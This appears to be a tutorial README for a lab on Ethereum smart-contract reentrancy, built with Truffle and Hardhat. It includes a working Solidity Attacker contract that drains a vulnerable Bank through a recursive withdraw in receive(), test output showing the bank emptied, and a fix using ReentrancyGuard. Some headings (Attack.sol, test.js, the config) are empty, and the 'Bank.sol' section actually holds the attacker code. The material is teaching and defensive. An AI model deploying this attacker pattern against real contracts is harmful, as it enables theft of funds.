### Setup truffle init
```powershell
truffle init
// architecture
401.attack_reentrancy 
├── contracts
│   └── Migrations.sol
├── migrations        
│   └── 1_initial_migration.js
├── README.md
├── test
└── truffle-config.js
```
### install package
```powershell
npm install --save-dev @nomiclabs/hardhat-ethers 
@nomiclabs/hardhat-waffle 
chai 
ethereum-waffle 
ethers
```
### install harthat
```powershell
npm init -y
npm install --save-dev hardhat
// architecture
401.attack_reentrancy
├── node_modules
├── contracts
│   ├── Attacker.sol
│   ├── Bank.sol
│   ├── Migrations.sol
│   └── Utils.sol
├── migrations
│   └── 1_initial_migration.js
├── package-lock.json
├── package.json
├── README.md
├── test
│   └── test.js
└── truffle-config.js
```
### Create harthat.config
```powershell
npx hardhat

888    888                      888 888               888
888    888                      888 888               888   
888    888                      888 888               888   
8888888888  8888b.  888d888 .d88888 88888b.   8888b.  888888
888    888     "88b 888P"  d88" 888 888 "88b     "88b 888   
888    888 .d888888 888    888  888 888  888 .d888888 888   
888    888 888  888 888    Y88b 888 888  888 888  888 Y88b. 
888    888 "Y888888 888     "Y88888 888  888 "Y888888  "Y888

Welcome to Hardhat v2.9.6

√ What do you want to do? · Create an empty hardhat.config.js
Config file created
```
choose Create empty harthat.config.js
### setup hardhat.config.js
```javascript

```
### Create Bank.sol
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Utils.sol";

interface IBank {
  function deposit() external payable;

  function withdraw() external;
}

contract Attacker is Ownable {
  IBank public immutable bankContract;

  constructor(address bankContractAddr) {
    bankContract = IBank(bankContractAddr);
  }

  function attack() external payable onlyOwner {
    bankContract.deposit{ value: msg.value }();
    bankContract.withdraw();
  }

  receive() external payable {
    if (address(bankContract).balance > 0) {
      bankContract.withdraw();
    } else {
      payable(owner()).transfer(address(this).balance);
    }
  }
}

```
### Create Attack.sol
### Create test.js
### Excute test with harthat-test
```powershell
npx hardhat test
//resutl:
  Deploy
    Test deposit and withdraw of Bank contract
      ✔ Should accept deposits (41ms)
      ✔ Should accept withdrawals (54ms)

*** Before ***
Bank's Balance: 150.0
Attacker's balance: 9999.997516974923208298

*** After ***
Bank's Balance: 0.0
Attacker's balance: 10149.997314361989225637

      ✔ Perform Attack (132ms)


  3 passing (3s)
```
### Add ReentrancyGuard in Bank.sol
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./Utils.sol";

contract Bank is ReentrancyGuard {
  using Address for address payable;
  mapping(address => uint256) public balanceOf;

  function deposit() external payable {
    balanceOf[msg.sender] += msg.value;
  }

  function withdraw() external nonReentrant {
    uint256 depositedAmount = balanceOf[msg.sender];
    payable(msg.sender).sendValue(depositedAmount);
    balanceOf[msg.sender] = 0;
  }
}

```

### run harthad test again
```powershell
//result:
  Deploy
    Test deposit and withdraw of Bank contract
      ✔ Should accept deposits (55ms)
      ✔ Should accept withdrawals (73ms)

*** Before ***
Bank's Balance: 150.0
Attacker's balance: 9999.997516538428892842
      1) Perform Attack


  2 passing (3s)
  1 failing

  1) Deploy
       Test deposit and withdraw of Bank contract
         Perform Attack:
     Error: VM Exception while processing transaction: reverted with reason string 'Address: unable to send value, recipient may have reverted'
    at Bank.sendValue (contracts/Utils.sol:56)
```